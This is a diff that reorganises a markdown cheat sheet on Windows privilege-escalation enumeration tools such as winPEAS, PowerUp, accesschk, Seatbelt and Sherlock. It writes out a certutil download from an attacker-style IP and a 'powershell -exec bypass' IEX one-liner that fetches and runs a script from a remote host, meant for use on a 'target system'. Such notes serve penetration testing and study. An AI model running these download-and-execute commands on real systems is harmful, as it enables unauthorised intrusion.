@@ -1,32 +1,9 @@
 
+# **📁 Automated Tools for Privilege Escalation**
 
-# PowerUp
+## 🛠 EXE Tools (Run as .exe files)
 
-```bash
-# Remote
-wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
-
-# local
-certutil -urlcache -split -f "http://10.17.68.184:8000/PowerUp.ps1" PowerUp.ps1
-```
-
-To run PowerUp, start a PowerShell session and **use dot sourcing to load the script:**
-
-```
-CMD> powershell -exec bypass
-
-PS> . .\PowerUp.ps1
-
-PS> Invoke-AllChecks
-
-# Run the Invoke-AllChecks function to start checking for common privilege escalation misconfigurations.
-```
-
-**OR**
-
-```
-C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"
-```
+You upload these `.exe` files to the target system and run them. They show you where the system might be weak.
 
 # accesschk.exe
 
@@ -62,14 +39,16 @@ accesschk.exe -uwdqs Users c:\
 accesschk.exe -uwdqs "Authenticated Users" c:\
 ```
 
-# winPEAS
+### ✅ winPEAS.exe
 
-winPEAS is a very powerful tool that not only actively hunts for privilege escalation misconfigurations, but highlights them for the user in the results.
+- **Job:** Checks for many weaknesses: services, passwords, file access, registry, etc.
+- **Download:** https://github.com/carlospolop/PEASS-ng/releases
+- **Download:**  https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
+- **Run it:**
 
 ```
-# Code: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
+winPEAS.exe
 ```
-
 Before running, we need to add a registry key and then reopen the command prompt:
 
 ```
@@ -87,24 +66,6 @@ Run specific check categories:
 ```
 .\winPEASany.exe quiet cmd systeminfo
 ```
-
-
-# **📁 Automated Tools for Privilege Escalation**
-
-### 🛠 EXE Tools (Run as .exe files)
-
-You upload these `.exe` files to the target system and run them. They show you where the system might be weak.
-
-### ✅ winPEAS.exe
-
-- **Job:** Checks for many weaknesses: services, passwords, file access, registry, etc.
-- **Download:** https://github.com/carlospolop/PEASS-ng/releases
-- **Run it:**
-
-```
-winPEAS.exe
-```
-
 ### ✅ Seatbelt.exe
 
 - **Job:** Shows security info like saved passwords, browser history, installed apps.
@@ -125,20 +86,33 @@ winPEAS.exe
 
 ---
 
-### 💻 PowerShell Scripts (.ps1 files)
+## 💻 PowerShell Scripts (.ps1 files)
 
 These are text files you run in PowerShell to look for weak spots.
 
 ### ✅ PowerUp.ps1
 
 - **Job:** Checks services, registry, DLLs, paths, etc. for privilege issues.
+- **Download (local):** certutil -urlcache -split -f "http://10.17.68.184:8000/PowerUp.ps1" PowerUp.ps1
 - **Download:** https://github.com/PowerShellMafia/PowerSploit
+- **Download:** https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps
 - **Use it:**
 
 ```
-Import-Module .\PowerUp.ps1
-Invoke-AllChecks
+CMD> powershell -exec bypass
+
+PS> . .\PowerUp.ps1
+
+PS> Invoke-AllChecks
+
+# Run the Invoke-AllChecks function to start checking for common privilege escalation misconfigurations.
 ```
+or
+```
+C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"
+```
+
+
 
 ### ✅ Sherlock.ps1
 
@@ -163,7 +137,7 @@ Find-AllVulnerabilities
 
 ---
 
-### 🐍 Python Tools (Run on your system)
+## 🐍 Python Tools (Run on your system)
 
 These tools read Windows version info and suggest known bugs.
 
